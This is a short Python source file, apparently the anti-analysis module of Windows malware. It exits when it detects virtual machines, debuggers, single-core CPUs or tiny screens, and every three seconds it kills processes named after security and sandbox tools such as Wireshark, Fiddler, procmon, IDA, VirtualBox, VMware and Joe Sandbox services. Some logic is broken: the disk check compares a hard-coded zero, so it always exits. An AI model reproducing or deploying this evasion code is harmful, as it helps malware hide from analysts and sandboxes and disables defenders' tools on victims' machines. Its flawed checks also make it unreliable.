# rip

from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
import threading, sys, multiprocessing, ctypes, time

class AntiDebug(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def detect_vm(self):
        if hasattr(sys, 'real_prefix'):
            sys.exit(0)

    def detect_hdd(self):
        from ctypes import c_ulonglong, windll, byref

        free_bytes_available = c_ulonglong()
        total_number_of_bytes = c_ulonglong()
        total_number_of_free_bytes = c_ulonglong()

        windll.kernel32.GetDiskFreeSpaceExA(
            'C:',
            byref(free_bytes_available),
            byref(total_number_of_bytes),
            byref(total_number_of_free_bytes)
        )
        
        disk_space = 0

        if disk_space < 100:
            sys.exit(0)

    def detect_core(self):
        if multiprocessing.cpu_count() == 1:
            sys.exit(0)

    def check_for_process(self):
        for proc in process_iter():
            try:
                for name in ['regmon', 'diskmon', 'procmon', 'http', 'traffic', 'wireshark', 'fiddler', 'packet', 'debugger', 'debuger', 'dbg', 'ida', 'dumper', 'pestudio', 'hacker', "vboxservice.exe","vboxtray.exe","vmtoolsd.exe","vmwaretray.exe","vmwareuser","VGAuthService.exe","vmacthlp.exe","vmsrvc.exe","vmusrvc.exe","prl_cc.exe","prl_tools.exe","xenservice.exe","qemu-ga.exe","joeboxcontrol.exe","joeboxserver.exe","joeboxserver.exe"]:
                    if name.lower() in proc.name().lower():
                        try:
                            proc.kill()
                        except:
                            sys.exit(0)
            except (NoSuchProcess, AccessDenied, ZombieProcess):
                sys.exit(0)

    def check_for_debugger(self):
        if ctypes.windll.kernel32.IsDebuggerPresent() != 0 or ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(), False) != 0:
            sys.exit()

    def detect_screen_syze(self):
        x = ctypes.windll.user32.GetSystemMetrics(0)
        y = ctypes.windll.user32.GetSystemMetrics(1)

        if x <= 200 or y <= 200:
            sys.exit()

    def run(self):
        self.detect_screen_syze()
        self.detect_core()
        self.detect_hdd()
        self.detect_vm()

        while True:
            self.check_for_process()
            self.check_for_debugger()
            time.sleep(3)